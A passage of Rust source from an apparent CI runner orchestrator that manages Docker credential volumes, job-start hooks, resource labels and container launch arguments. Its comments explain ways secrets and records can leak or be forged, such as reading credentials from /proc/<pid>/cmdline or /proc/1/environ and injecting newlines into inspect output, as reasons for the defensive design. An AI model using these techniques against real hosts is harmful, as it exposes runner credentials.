        f.dir.to_string(),
        f.file.to_string(),
        f.owner.unwrap_or("").to_string(),
    ]);
    args
}

/// The fill's `docker` child: [`docker_command`]'s allowlisted environment and
/// [`credential_fill_args`], nothing else. Split out so a test can read the
/// child's whole argv and environment and find no secret in either.
fn credential_fill_command(f: &CredentialFill<'_>) -> Command {
    let mut cmd = docker_command();
    cmd.args(credential_fill_args(f));
    cmd
}

/// A named volume holding one credential file, removed when the guard is.
///
/// The one way faber hands a container a secret now that its Docker runs in a VM
/// that shares no host folder (ADR-0026). The volume is created with faber's
/// labels, then filled by a short-lived container that reads the secret from its
/// stdin ([`untrusted::output_within_fed`]): never on an argv, which `ps` shows
/// every account, never in an environment, never in a host temp file. The
/// consumer mounts it `:ro` at the same path the fill wrote it.
///
/// Removal: the owner calls [`Self::remove`] once nothing mounts the volume. A
/// guard dropped without that — a panic, a dropped future — spawns the same
/// removal, and anything both miss (a crash) is reaped by the janitor by its
/// kind label.
pub(crate) struct CredentialVolume {
    name: String,
    /// Cleared once [`Self::remove`] has run, so `Drop` does not run it twice.
    live: bool,
}

impl CredentialVolume {
    /// Create `f.volume` and write `secret` into it. On any failure the volume is
    /// removed again and the error says why, never what.
    pub(crate) async fn fill(f: &CredentialFill<'_>, secret: &[u8]) -> anyhow::Result<Self> {
        docker_ok(&volume_create_args(f.volume, f.labels), CLI_TIMEOUT)
            .await
            .map_err(|e| anyhow::anyhow!("creating credential volume {}: {e}", f.volume))?;
        // The guard exists from the moment the volume does, so every return below
        // removes it.
        let volume = Self {
            name: f.volume.to_string(),
            live: true,
        };
        let out = untrusted::output_within_fed(
            credential_fill_command(f),
            secret.to_vec(),
            LAUNCH_TIMEOUT,
            CREDENTIAL_FILL_CAP,
            "docker run (credential fill)",
        )
        .await;
        let failed = match out {
            Ok(o) if o.status.success() => None,
            Ok(o) => Some(format!("docker exited {}: {}", o.status, stderr_of(&o))),
            Err(e) => Some(e.to_string()),
        };
        if let Some(why) = failed {
            // A fill that overran its cap may still be running and mounting the
            // volume, so it goes before the volume can.
            if let Err(e) = docker_rm(&["rm", "-f", f.container]).await {
                warn!("credential fill: removing container {}: {e}", f.container);
            }
            volume.remove().await;
            anyhow::bail!("filling credential volume {}: {why}", f.volume);
        }
        // The file is written. Removing the exited container is cleanup, not part
        // of the fill, so a slow removal delays nobody and fails nothing (#348);
        // one that fails is left to its kind's reaper.
        let container = f.container.to_string();
        tokio::spawn(async move {
            if let Err(e) = docker_rm(&["rm", "-f", &container]).await {
                warn!("credential fill: removing exited container {container}: {e}");
            }
        });
        Ok(volume)
    }

    /// The volume's name, which is all a consumer's `-v` needs.
    pub(crate) fn name(&self) -> &str {
        &self.name
    }

    /// Remove the volume, retrying while the daemon still reports it in use.
    pub(crate) async fn remove(mut self) {
        self.live = false;
        remove_volume(&self.name).await;
    }

    /// Keep the volume past this guard: its owner removes it by its kind label
    /// when the long-lived container that mounts it goes (the pull-through
    /// mirror's credential, [`crate::mirror`]).
    pub(crate) fn keep(mut self) {
        self.live = false;
    }
}

impl Drop for CredentialVolume {
    /// The fallback for a guard nobody called [`CredentialVolume::remove`] on. A
    /// volume removal is a daemon call, so it is spawned onto the runtime; with no
    /// runtime, or a container still mounting it, the janitor reaps the volume by
    /// its kind once its owner is gone.
    fn drop(&mut self) {
        if !self.live {
            return;
        }
        let name = std::mem::take(&mut self.name);
        match tokio::runtime::Handle::try_current() {
            Ok(rt) => {
                rt.spawn(async move { remove_volume(&name).await });
            }
            Err(_) => warn!("credential volume {name}: left to the janitor"),
        }
    }
}

// --- the job-started hook (ADR-0059) -----------------------------------------

/// The script the hook fill runs as `sh -c`, with the mount directory and the
/// file name as `$1` and `$2`. Unlike a credential, the hook is no secret and
/// must be readable by whichever user the runner runs as, so it is `0644` in a
/// `0755` directory, root's. The mount is read-only in the runner, so no user
/// there can change it. It prints the file's size, which faber checks against
/// what it sent: that is the check that the hook is in place.
const HOOK_FILL_SCRIPT: &str = r#"set -e
umask 022
cat > "$1/$2"
chmod 0755 "$1"
chmod 0644 "$1/$2"
wc -c < "$1/$2"
"#;

/// Create the runner's hook volume and write `script` into it over the fill
/// container's stdin, then check it is all there (ADR-0059 §1). The fill runs
/// from the runner's own image, which is local (`--pull=never`), with no
/// network. An error names the step; the caller starts no runner on one, and
/// teardown removes the volume.
async fn fill_hook_volume(
    names: &Names,
    owner_repo: &str,
    image: &str,
    script: &str,
) -> anyhow::Result<()> {
    let labels = marks(KIND_HOOK, owner_repo, &names.id);
    docker_ok(&volume_create_args(&names.hook, &labels), CLI_TIMEOUT)
        .await
        .map_err(|e| anyhow::anyhow!("creating volume {}: {e}", names.hook))?;
    let f = CredentialFill {
        volume: &names.hook,
        labels: &labels,
        container: &names.hook_fill,
        image,
        dir: crate::job_start::HOOK_DIR,
        file: crate::job_start::HOOK_FILE,
        owner: None,
    };
    let mut cmd = docker_command();
    cmd.args(fill_args(&f, HOOK_FILL_SCRIPT));
    let out = untrusted::output_within_fed(
        cmd,
        script.as_bytes().to_vec(),
        LAUNCH_TIMEOUT,
        CREDENTIAL_FILL_CAP,
        "docker run (hook fill)",
    )
    .await;
    // The fill container has done its work either way; removing it is cleanup,
    // and one that fails is reaped by its kind.
    let container = names.hook_fill.clone();
    tokio::spawn(async move {
        if let Err(e) = docker_rm(&["rm", "-f", &container]).await {
            warn!("hook fill: removing container {container}: {e}");
        }
    });
    let out = out?;
    if !out.status.success() {
        anyhow::bail!(
            "filling {}: docker exited {}: {}",
            names.hook,
            out.status,
            stderr_of(&out)
        );
    }
    hook_in_place(&String::from_utf8_lossy(&out.stdout), script.len())
        .map_err(|e| anyhow::anyhow!("filling {}: {e}", names.hook))
}

/// Whether the fill's report of the written file's size (`wc -c`) says the
/// whole hook is in place.
fn hook_in_place(reported: &str, sent: usize) -> anyhow::Result<()> {
    match reported.trim().parse::<usize>() {
        Ok(n) if n == sent && n > 0 => Ok(()),
        Ok(n) => anyhow::bail!("the hook file holds {n} bytes, not the {sent} written"),
        Err(_) => anyhow::bail!("the fill did not report the hook file's size"),
    }
}

/// What a runner's container shows of its job and its hook right now, by the
/// name the runner registered with GitHub (ADR-0059 §2). Read from `docker top`
/// with the executable names and parent pids only: never the command lines.
pub(crate) async fn job_start_seen(runner_name: &str) -> crate::job_start::Seen {
    use crate::job_start::{Seen, Top};
    let names = Names::for_runner(runner_name);
    match docker_output(&["top", &names.runner, "-eo", "pid,ppid,comm"], CLI_TIMEOUT).await {
        Ok(out) if out.status.success() => {
            Seen::Running(Top::parse(&String::from_utf8_lossy(&out.stdout)))
        }
        _ => match container_running(&names.runner).await {
            Some(false) => Seen::Gone,
            Some(true) | None => Seen::Unknown,
        },
    }
}

/// Write a verdict into a runner's container through the Docker API (ADR-0059
/// §2): `docker cp -` extracts [`crate::job_start::Delivery::archive`], read
/// from this child's stdin, into the directory the hook waits on. The caller
/// delivers only to a hook it has just seen waiting.
pub(crate) async fn deliver_verdict(runner_name: &str, archive: Vec<u8>) -> anyhow::Result<()> {
    let names = Names::for_runner(runner_name);
    let target = format!("{}:{}", names.runner, crate::job_start::VERDICT_DIR);
    let mut cmd = docker_command();
    cmd.args(["cp", "-", target.as_str()]);
    let out = untrusted::output_within_fed(
        cmd,
        archive,
        CLI_TIMEOUT,
        CREDENTIAL_FILL_CAP,
        "docker cp (verdict)",
    )
    .await?;
    if !out.status.success() {
        anyhow::bail!("docker exited {}: {}", out.status, stderr_of(&out));
    }
    Ok(())
}

/// Label key stamped on every resource faber creates. Its presence is the
/// authoritative answer to "is this mine?".
pub(crate) const LABEL_OWNED: &str = "org.faber.owned";
/// Which kind of resource — `runner`, `dind`, `net`, `vol`, `cache`, `image`,
/// `registry-auth`, `git-mirror`, `git-mirror-work`, `git-auth`.
pub(crate) const LABEL_KIND: &str = "org.faber.kind";
/// On a faber-built runner-image variant, the id of the base image it derives
/// from (ADR-0008). Absent on everything else, including the base itself.
pub(crate) const LABEL_BASE: &str = "org.faber.base";
/// The `org.faber.kind` value identifying a faber-built runner-image variant —
/// the *only* image faber may ever remove, because it is the only one faber can
/// rebuild. See ADR-0008 and AGENTS.md.
pub(crate) const KIND_IMAGE: &str = "image";

// The per-job `org.faber.kind` values. They live here, beside the [`marks`] that
// writes them, rather than as literals at each `marks(...)` call and a second
// copy in [`crate::sweep`]: the janitor's reapable-kind list *is* this set, and
// two hand-written copies of it drift silently — the failure being a kind faber
// still creates and the sweep no longer recognises, i.e. a permanent leak.
/// The runner container — the claim itself (ADR-0011).
pub(crate) const KIND_RUNNER: &str = "runner";
/// The per-job dind daemon.
pub(crate) const KIND_DIND: &str = "dind";
/// The per-job private network.
pub(crate) const KIND_NET: &str = "net";
/// The per-job dind `/var/lib/docker` volume.
pub(crate) const KIND_VOL: &str = "vol";
/// The per-job read-only volume holding the runner's job-started hook
/// (ADR-0059 §1), and the short-lived container that filled it.
pub(crate) const KIND_HOOK: &str = "hook";
/// The persistent per-repo build cache (ADR-0005). Emphatically **not** a
/// per-job kind: it is dangling between jobs and must outlive every one of
/// them, so it is absent from [`crate::sweep`]'s reapable set and the sweep
/// shields anything wearing it. See [`cache_volume_name`].
pub(crate) const KIND_CACHE: &str = "cache";
/// The per-repo git mirror only faber writes (ADR-0035). Not a per-job kind
/// either: like [`KIND_CACHE`] it is absent from [`crate::sweep`]'s reapable set,
/// and only [`crate::git_mirror`] ever removes one.
pub(crate) const KIND_GIT_MIRROR: &str = "git-mirror";
/// The short-lived containers that refresh, repack and prune a git mirror
/// (ADR-0035 §1, §4). Removed on exit (`--rm`), and not a reapable kind, so the
/// sweep never kills a refresh in progress.
pub(crate) const KIND_GIT_MIRROR_WORK: &str = "git-mirror-work";
/// The one pull-through mirror container and its cache volume ([`crate::mirror`]).
/// Not a per-job kind: it outlives every job and carries no claim, so it is
/// absent from [`crate::sweep`]'s reapable set, and only [`crate::mirror`]'s own
/// janitor replaces the container.
pub(crate) const KIND_MIRROR: &str = "mirror";
/// The per-job volume that held a runner's registry credential, and the
/// short-lived container that filled it. faber makes neither while
/// `[registry_auth]` is held ([`RegistryAuth`]); the kind stays in
/// [`crate::sweep`]'s reapable set so a volume an earlier release left is still
/// reaped once its `org.faber.id` is no longer in flight.
pub(crate) const KIND_REGISTRY_AUTH: &str = "registry-auth";
/// The volume holding one git-mirror refresh's fetch credential (ADR-0035 §1). It
/// carries no claim, so it is not in [`crate::sweep`]'s reapable set:
/// [`crate::git_mirror`]'s janitor reaps a leftover once no refresh of its repo
/// holds the writer lock.
pub(crate) const KIND_GIT_AUTH: &str = "git-auth";
/// The volume holding faber's GitHub credential for the pull-through mirror's
/// LFS adapter (ADR-0047 §4), and the container that fills it. Not a per-job
/// kind, so not in [`crate::sweep`]'s reapable set: [`crate::mirror`] replaces it
/// with the container and removes it when the mirror is retired.
pub(crate) const KIND_MIRROR_AUTH: &str = "mirror-auth";

/// The repo whose CI the resource was created for.
pub(crate) const LABEL_REPO: &str = "org.faber.repo";
/// `<job_id>-<mint_ts>`, tying the resource back to one claim.
pub(crate) const LABEL_ID: &str = "org.faber.id";

// --- ADR-0011: the runner container *is* the claim -------------------------
//
// The five marks below are stamped on the runner container alone. They are not
// provenance like the four above — they are the claim itself, written where a
// process that did not create it can still read it. Everything `reconcile`
// needs to rebuild an in-flight `Claim` after a restart is here, because the
// alternative (a journal beside Docker) is a second source of truth that loses
// to Docker whenever the two disagree.
//
// They are deliberately *static*: a label is fixed at `docker run` and cannot be
// updated. Nothing that changes mid-claim may live here. The three that do —
// the resolved image, the job GitHub actually dispatched, the live step — are
// readable from the container itself, from GitHub, and from the next poll.

/// The workflow run this claim belongs to.
const LABEL_RUN_ID: &str = "org.faber.run-id";
/// faber's own provision-attempt counter for this job (not GitHub's
/// `run_attempt`), so an adopted run's outcome record says what a non-adopted
/// one would have said.
const LABEL_ATTEMPT: &str = "org.faber.provision-attempt";
/// The routing profile serving this claim — selects the backend on rebuild.
const LABEL_PROFILE: &str = "org.faber.profile";
/// The autolimiter class key this run belongs to.
const LABEL_CLASS: &str = "org.faber.class";
/// What the limiter *charged* for this claim.
///
/// Load-bearing, and not recoverable by inspecting the container: a claim is
/// charged `own_runner + own_dind` while the container is *started* with the
/// cohort peer-max ceilings (see `Limiter::sizing_for`). Reading `--memory` back
/// would over-charge the rebuilt ledger and collapse concurrency.
const LABEL_RESERVED: &str = "org.faber.reserved-mib";
/// The CPU the limiter charged for this claim, in millicores (ADR-0019) — for the
/// same reason as [`LABEL_RESERVED`]: the runner's `--cpus` quota is the cohort's
/// peer max, not the claim's own share, so reading the quota back would
/// over-charge.
///
/// Optional on read, unlike every other claim mark: a container minted before
/// ADR-0019 lacks it and is still perfectly adoptable. It is charged its class's
/// current share instead (see `reconcile::Orchestrator::adopt`).
const LABEL_RESERVED_MCPU: &str = "org.faber.reserved-mcpu";
/// The toolchain versions this container's image *serves* (ADR-0009), comma-
/// joined. Empty is meaningful and distinct from absent: it is the "unknown
/// image" that constrains nothing. Without it an adopted claim would rejoin the
/// pool as unknown and `pool_decision` would filter it straight back out — the
/// runner would be live and invisible, which is the state ADR-0009 exists to
/// forbid.
const LABEL_SERVES: &str = "org.faber.serves";

/// The services this runner has (ADR-0046 §10), comma-joined
/// ([`crate::services::ServicePlan::mark`]): `postgres-16,redis`. Optional and
/// absent when it had none, and deliberately not one of [`ADOPT_LABELS`], so a
/// container started before this release stays adoptable. An adopted claim
/// reads it to detach its services at teardown and to name them in its outcome.
const LABEL_SERVICES: &str = "org.faber.services";

/// What the runner's job-started hook does at its deadline with no verdict,
/// decided at mint (ADR-0059 §1): `allow` or `refuse`. Absent on a container
/// started before the hook existed, which then has no hook, and is left to
/// bypass detection: watching it would only report a hook fault on every job.
const LABEL_HOOK: &str = "org.faber.hook";

/// The claim facts stamped on a runner container so a later process can rebuild
/// it (ADR-0011). Built by `reconcile::spawn_provision`, which is the only place
/// that knows all five at once.
#[derive(Debug, Clone, Default, PartialEq)]
pub struct ClaimMarks {
    pub run_id: u64,
    pub attempt: u32,
    pub profile: String,
    pub class: String,
    pub reserved_mib: u64,
    /// The CPU the limiter charged, in millicores (ADR-0019).
    pub reserved_mcpu: u64,
    /// Comma-joined `PoolImage::serves`. Empty = unknown, which is a real value.
    pub serves: String,
    /// [`crate::services::ServicePlan::mark`]: the runner's services. Empty = none,
    /// and then no [`LABEL_SERVICES`] is stamped at all.
    pub services: String,
    /// The runner's job-started hook (ADR-0059 §1): its deadline, and its
    /// outcome at the deadline, stamped as [`LABEL_HOOK`].
    pub hook: crate::job_start::HookPlan,
}

/// The `--label` flags carrying [`ClaimMarks`]. Appended to [`marks`] for the
/// runner container only — dind, the network and the volume are reaped by
/// ownership, never adopted, so they need nothing beyond provenance.
fn claim_marks(c: &ClaimMarks) -> Vec<String> {
    [
        format!("{LABEL_RUN_ID}={}", c.run_id),
        format!("{LABEL_ATTEMPT}={}", c.attempt),
        format!("{LABEL_PROFILE}={}", c.profile),
        format!("{LABEL_CLASS}={}", c.class),
        format!("{LABEL_RESERVED}={}", c.reserved_mib),
        format!("{LABEL_RESERVED_MCPU}={}", c.reserved_mcpu),
        format!("{LABEL_SERVES}={}", c.serves),
        format!("{LABEL_HOOK}={}", c.hook.outcome.as_str()),
    ]
    .into_iter()
    .chain((!c.services.is_empty()).then(|| format!("{LABEL_SERVICES}={}", c.services)))
    .flat_map(|kv| ["--label".to_string(), kv])
    .collect()
}

/// The `--label` flags stamped on every container, network and volume faber
/// creates.
///
/// Ownership used to be a *naming convention*: everything faber made was called
/// `faber-<kind>-<id>`, and everything that reaped it matched on that prefix.
/// A convention is not a fact. It cannot distinguish faber's own `faber-dind-…`
/// from an unrelated compose project that happens to produce
/// `myproj-faber-dind-1` — [`crate::sweep`] still carries explicit shielding for
/// as long as its legacy name listing runs — and it says nothing about *who* may
/// delete a resource, which is the question that matters once faber is allowed
/// to reclaim disk on its own (ADR-0007).
///
/// A label answers it directly and cannot be produced by accident: `docker ps
/// --filter label=org.faber.owned=true` returns faber's resources and only
/// faber's, whatever anything happens to be named. The rest of the marks make a
/// stray resource self-explaining — which repo it served and which claim it
/// belonged to — so an operator finding one at 2am does not have to decode a
/// name to know what it is or whether it is safe to remove.
pub(crate) fn marks(kind: &str, owner_repo: &str, id: &str) -> Vec<String> {
    [
        format!("{LABEL_OWNED}=true"),
        format!("{LABEL_KIND}={kind}"),
        format!("{LABEL_REPO}={owner_repo}"),
        format!("{LABEL_ID}={id}"),
    ]
    .into_iter()
    .flat_map(|kv| ["--label".to_string(), kv])
    .collect()
}

/// Provenance plus the ADR-0011 claim marks — what a runner container carries.
///
/// Kept as one call rather than two concatenated at the launch site so the
/// runner's label set has exactly one definition to read, and so a test can
/// assert it whole.
fn runner_marks(owner_repo: &str, id: &str, claim: &ClaimMarks) -> Vec<String> {
    let mut m = marks(KIND_RUNNER, owner_repo, id);
    m.extend(claim_marks(claim));
    m
}

// --- argv builders (pure, unit-tested) -------------------------------------

/// The optional attachments a runner may get: the per-repo build-cache volume
/// (ADR-0005) and the repo's read-only git mirror (ADR-0035). No registry
/// credential: `[registry_auth]` is held ([`RegistryAuth`]).
///
/// Every one is a named volume, never a host path: faber's Docker runs in a Linux
/// VM that shares no host folder (ADR-0026), so a host path would mount an empty
/// directory the daemon conjured inside the VM.
///
/// Bundled rather than passed as more positionals for the reason
/// [`crate::reconcile`]'s `Finished` is a struct: past a certain width the
/// arguments stop documenting themselves and become an invitation to transpose
/// two of them. Each is `Option`, and each means "attach this if it exists".
#[derive(Default, Clone, Copy)]
struct Mounts<'a> {
    cache_vol: Option<&'a str>,
    git_mirror: Option<&'a str>,
    /// The names of the variables the job's services hand the runner (ADR-0046
    /// §4): `DATABASE_URL`, `REDIS_URL`. Names only, like `RUNNER_JITCONFIG`;
    /// their values travel in the `docker` CLI child's own environment.
    service_env: &'a [&'a str],
    /// The pull-through mirror's variables ([`crate::mirror::Injection::env`]),
    /// when the mirror was connected to the job's network. None is secret.
    mirror_env: &'a [(String, String)],
    /// The names of the mirror's secret variables
    /// ([`crate::mirror::Injection::secret_env`]): names only, like the services';
    /// their values travel in the `docker` CLI child's own environment.
    mirror_secret_env: &'a [&'a str],
    /// The volume holding the job-started hook (ADR-0059 §1), mounted read-only.
    /// Every runner [`run_in_sandbox`] starts has one; `None` only in tests of
    /// the other mounts.
    hook_vol: Option<&'a str>,
}

/// `docker network create` for a per-job network, optionally pinned to `subnet`.
///
/// `None` omits the flag entirely and the daemon allocates from its own default
/// pools — the behaviour of every release before [`crate::netpool`] existed, and
/// still the behaviour on a host that has declared no pool.
fn network_create_args(net: &str, marks: &[String], subnet: Option<&str>) -> Vec<String> {
    let mut args: Vec<String> = vec!["network".into(), "create".into()];
    if let Some(sub) = subnet {
        args.push("--subnet".into());
        args.push(sub.into());
    }
    args.extend_from_slice(marks);
    args.push(net.into());
    args
}

/// `docker volume create` for a resource faber owns. Per-job volumes used to be
/// created implicitly by `docker run -v name:/path`, which gives them no labels
/// and so no provenance — creating them explicitly is what lets them be marked.
fn volume_create_args(name: &str, marks: &[String]) -> Vec<String> {
    let mut args: Vec<String> = vec!["volume".into(), "create".into()];
    args.extend_from_slice(marks);
    args.push(name.into());
    args
}

fn dind_run_args(
    dind: &str,
    net: &str,
    vol: &str,
    dind_image: &str,
    limits: &ResourceLimits,
    marks: &[String],
) -> Vec<String> {
    let mut args: Vec<String> = vec![
        "run".into(),
        "-d".into(),
        "--privileged".into(),
        "--name".into(),
        dind.into(),
        "--network".into(),
        net.into(),
        // The alias is load-bearing: jobs reach the daemon (and the service
        // containers it publishes) via the hostname `dind`.
        "--network-alias".into(),
        "dind".into(),
        // docker:dind declares VOLUME /var/lib/docker — every image and layer
        // the job pulls lands there, making it the job's heaviest artifact.
        // Mount it as a *named* volume so teardown can remove it; anonymous,
        // it survives `docker rm` and disk grows by ~the job's pulls, forever.
        "-v".into(),
        format!("{vol}:/var/lib/docker"),
        // Plain TCP on 2375 (no TLS) so the runner's DOCKER_HOST=tcp://dind:2375 works.
        "-e".into(),
        "DOCKER_TLS_CERTDIR=".into(),
    ];
    args.extend_from_slice(marks);
    // Resource ceilings are `docker run` flags, so they must precede the image.
    limits.push_args(&mut args);
    args.push(dind_image.into());
    // Explicit no-TLS opt-in (a dockerd arg, forwarded by docker:dind's
    // entrypoint). Without it, docker:dind treats the plain-TCP bind as
    // *implicit* and imposes a deliberate ~15s startup penalty on every job;
    // this is also the documented override for the coming hard-failure when
    // implicit insecure binding is removed. The bind is safe here regardless:
    // an isolated, per-job network that is torn down after the one job.
    args.push("--tls=false".into());
    args
}

/// The container image's own JIT contract (see the module doc): `docker run`
/// gets this *name* only — `-e RUNNER_JITCONFIG`, no `=value` — so the runner's
/// single-use registration secret travels in the launching `docker` CLI
/// child's own environment (set by [`run_in_sandbox`]) instead of its argv,
/// where `ps` would show it to every account on the host (AGENTS.md/ADR-0025
/// §8). This is the *image's* variable name, fixed by faber's own contract
/// with the entrypoint script — unrelated to
/// `ACTIONS_RUNNER_INPUT_JITCONFIG`, which is a different name GitHub's own
/// runner binary defines.
///
/// The contract does not end at this container's boundary. An entrypoint that
/// received this safely and then put it on *its own* exec's argv (`run.sh
/// --jitconfig "$RUNNER_JITCONFIG"`) would reopen exactly the hole this avoids
/// — `/proc/<pid>/cmdline` is world-readable on a native Linux dockerd host, so
/// any local account could read it and take the job. A security review found
/// `docker/runner/entrypoint.sh` doing exactly that; it now hands the value to
/// `run.sh` as `ACTIONS_RUNNER_INPUT_JITCONFIG` in the environment instead —
/// the runner's own CLI parser reads that as `--jitconfig`'s fallback. Every
/// third-party runner image's entrypoint must do the same.
///
/// That keeps it off argv, and no more. It does **not** keep it from the job
/// (#66). The runner scrubs the variable from its own process, but the
/// container's PID 1 was started with it and still carries it in its
/// environment, and a step running as the runner's user can read that
/// (`/proc/1/environ`); the container's own config (`docker inspect`) carries
/// `RUNNER_JITCONFIG` too. By the time a step runs, the config is spent: the
/// runner has registered with it and taken its one job. Nothing faber relies on
/// treats it as a secret from the job, and the job-start hook (ADR-0059) in
/// particular must never depend on it staying one.
///
/// A profile's `env` cannot name it: `faber check-config` and the settings save
/// refuse one that does, and the boot drops it with a warning
/// ([`crate::config::FABER_OWNED_ENV`]).
pub(crate) const RUNNER_JITCONFIG_ENV: &str = "RUNNER_JITCONFIG";

/// Whether a failed runner launch is retried once without the git mirror
/// (ADR-0035 §2: if anything about the mount fails, the job runs without it).
///
/// Only when a mirror was mounted, and only when the daemon answered and refused
/// (`docker exited …`, what [`docker_ok`] says of a non-zero exit). A launch that
/// timed out may have started the runner, which may already have registered with
/// the JIT config, so it is never retried: a second runner could come up, or the
/// retry would fail on a spent config anyway.
fn retry_launch_without_mirror(mirror_mounted: bool, err: &str) -> bool {
    mirror_mounted && err.starts_with("docker exited")
}

fn runner_run_args(
    runner: &str,
    net: &str,
    mounts: Mounts<'_>,
    cfg: &DockerConfig,
    limits: &ResourceLimits,
    marks: &[String],
) -> Vec<String> {
    // `DOCKER_HOST` is the grant, expressed. Withholding it is not cosmetic — a
    // denied profile starts no daemon at all, so pointing the job at one would
    // only replace "no Docker" with "a Docker that never answers", and a job's
    // first `docker` call would hang out its connect timeout instead of failing
    // immediately with the ordinary "is the docker daemon running?" message.
    let dind = cfg.dind.granted();
    // No `--rm`: the container must survive its own exit so the watcher can
    // inspect `.State.OOMKilled`. Teardown force-removes it unconditionally.
    //
    // `-d`, and this is load-bearing rather than tidy (ADR-0011). An *attached*
    // `docker run` defaults to `--sig-proxy=true`, so the client forwards signals
    // it receives into the container — and launchd signals the whole process
    // group when faber exits. Attached, "faber goes away" therefore meant "every
    // runner it started is SIGTERMed", which is the opposite of what adoption
    // needs and was observed live: adopted runners died with exit 143 seconds
    // after a clean handoff, and their jobs went back to `queued`.
    //
    // Detached, the container belongs to the Docker daemon alone. Nothing about
    // faber's lifetime reaches it, and the watcher becomes a `docker wait` that
    // any process can issue — which is what makes an adopted container and a
    // freshly-started one the same object rather than merely similar ones.
    //
    // `--pull=never` (#156): the image is the profile's own, which faber has
    // checked is local and pulled itself under `[host] pull_unqualified_images`
    // when it was not (`crate::profile_image`), or a variant faber built here
    // (ADR-0008). Left to `docker run`, a deleted local-only `owner/x` tag was
    // fetched from whoever holds Docker Hub's `owner` namespace.
    let mut args = vec![
        "run".into(),
        "-d".into(),
        "--pull=never".into(),
        "--name".into(),
        runner.into(),
        "--network".into(),
        net.into(),
    ];
    if dind {
        args.push("-e".into());
        args.push("DOCKER_HOST=tcp://dind:2375".into());
    }
    // Name only, deliberately — see [`RUNNER_JITCONFIG_ENV`]. The value is never
    // in this argv; the caller sets it on the `docker` CLI child's own
    // environment, and `docker run -e NAME` (no `=`) forwards that.
    args.push("-e".into());
    args.push(RUNNER_JITCONFIG_ENV.to_string());
    // The services' variables (ADR-0046 §10), name-only for the same reason: a
    // `DATABASE_URL` carries the role's password. Before `cfg.env`, so a
    // profile's own value for one of them wins, as it does for `DOCKER_HOST`:
    // Docker resolves a repeated `-e` to the last occurrence.
    for name in mounts.service_env {
        args.push("-e".into());
        args.push((*name).to_string());
    }
    args.extend_from_slice(marks);
    // Resource ceilings are `docker run` flags, so they must precede the image.
    limits.push_args(&mut args);
    // A faber-owned name never comes from a profile (ADR-0059 §1): the boot
    // drops one already, and this keeps any other path to `cfg.env` from
    // deciding the JIT config or the hook.
    for (k, v) in cfg
        .env
        .iter()
        .filter(|(k, _)| crate::config::faber_owned_env(k).is_none())
    {
        args.push("-e".into());
        args.push(format!("{k}={v}"));
    }
    // The cache mount goes LAST of the flags, after `cfg.env`: Docker resolves a
    // repeated `-e KEY=` to the last occurrence, so faber's own value wins over a
    // profile that sets `FABER_CACHE_DIR` by hand. The variable must describe what
    // was actually mounted or a workflow's guard is worthless.
    if let Some(vol) = mounts.cache_vol {
        args.push("-v".into());
        args.push(format!("{vol}:{CACHE_MOUNT}"));
        args.push("-e".into());
        args.push(format!("{CACHE_DIR_ENV}={CACHE_MOUNT}"));
    }
    // The git mirror (ADR-0035 §2): `:ro`, which is the whole of its trust model,
    // and after `cfg.env` like the cache so the variable names the real mount.
    args.extend(crate::git_mirror::runner_args(mounts.git_mirror));
    // The pull-through mirror's variables, after `cfg.env` for the same reason:
    // they must name the mirror faber actually connected, so faber's value wins.
    for (k, v) in mounts.mirror_env {
        args.push("-e".into());
        args.push(format!("{k}={v}"));
    }
    // Its secret ones by name alone: `docker run -e NAME` forwards the value
    // from the CLI child's environment, so it is never on this argv.
    for name in mounts.mirror_secret_env {
        args.push("-e".into());
        args.push((*name).to_string());
    }
    // The job-started hook (ADR-0059 §1), last of all, so faber's value of the
    // variable is the one the runner sees whatever came before it: Docker
    // resolves a repeated `-e` to its last occurrence. `:ro`, so nothing in the
    // container can rewrite the hook, and the hook has run before any of the
    // job's code can try.
    if let Some(vol) = mounts.hook_vol {
        args.push("-v".into());
        args.push(format!("{vol}:{}:ro", crate::job_start::HOOK_DIR));
        args.push("-e".into());
        args.push(format!(
            "{}={}",
            crate::job_start::HOOK_ENV,
            crate::job_start::hook_path()
        ));
    }
    args.push(cfg.image.clone());
    args
}

// ---------------------------------------------------------------------------
// ADR-0011: adopting a runner container a previous faber started
// ---------------------------------------------------------------------------

/// The `docker container inspect` fields adoption needs, as one JSON object per
/// container, every value escaped by Docker's own `json` function.
///
/// The labels come back as the whole map, so a label that is absent is absent
/// from the map — the signal a container predates ADR-0011 and cannot be adopted
/// — and stays distinguishable from one that is present and empty. JSON rather
/// than the tab-separated template this replaced (#105): there, a label value
/// carrying a tab shifted every field after it, and one carrying a newline could
/// print a second, forged container of its own.
const ADOPT_FORMAT: &str = concat!(
    r#"{"Name":{{json .Name}},"Running":{{json .State.Running}},"#,
    r#""StartedAt":{{json .State.StartedAt}},"Memory":{{json .HostConfig.Memory}},"#,
    r#""NanoCpus":{{json .HostConfig.NanoCpus}},"Image":{{json .Config.Image}},"#,
    r#""Labels":{{json .Config.Labels}}}"#,
);

/// One container as [`ADOPT_FORMAT`] prints it.
#[derive(Debug, Clone, Deserialize)]
struct Inspected {
    #[serde(rename = "Name")]
    name: String,
    #[serde(rename = "Running", default)]
    running: bool,
    #[serde(rename = "StartedAt", default)]
    started_at: String,
    #[serde(rename = "Memory", default)]
    memory: i64,
    #[serde(rename = "NanoCpus", default)]
    nano_cpus: i64,
    #[serde(rename = "Image", default)]
    image: String,
    #[serde(rename = "Labels", default)]
    labels: Option<BTreeMap<String, String>>,
}

impl Inspected {
    /// The container's name without the `/` Docker's inspect puts in front of it.
    fn bare_name(&self) -> &str {
        self.name.strip_prefix('/').unwrap_or(&self.name)
    }

    fn label(&self, key: &str) -> Option<&str> {
        self.labels.as_ref()?.get(key).map(String::as_str)
    }
}

/// The ADR-0011 claim labels a runner container must carry to be adopted, with
/// the short name a log line gives each.
const ADOPT_LABELS: [(&str, &str); 7] = [
    ("repo", LABEL_REPO),
    ("run-id", LABEL_RUN_ID),
    ("provision-attempt", LABEL_ATTEMPT),
    ("profile", LABEL_PROFILE),
    ("class", LABEL_CLASS),
    ("reserved-mib", LABEL_RESERVED),
    ("serves", LABEL_SERVES),
];

/// The longest profile name an adopted container may claim.
const MAX_PROFILE_LABEL: usize = 128;

/// The longest class key an adopted container may claim: a repo, a workflow id
/// and a job name, which GitHub lets run long.
const MAX_CLASS_LABEL: usize = 1024;

/// A container's applied memory ceiling (`HostConfig.Memory`, bytes) as MiB, held
/// to [`untrusted::MAX_MEM_BYTES`], or `None` for a negative figure, which is no
/// ceiling at all. `0` is a real value, "no ceiling".
///
/// Held rather than refused (#105): this is what a running container is charged
/// when its claim cannot be read, so an absurd figure must charge the most there
/// is, never fall through to charging nothing.
fn memory_mib(bytes: i64) -> Option<u64> {
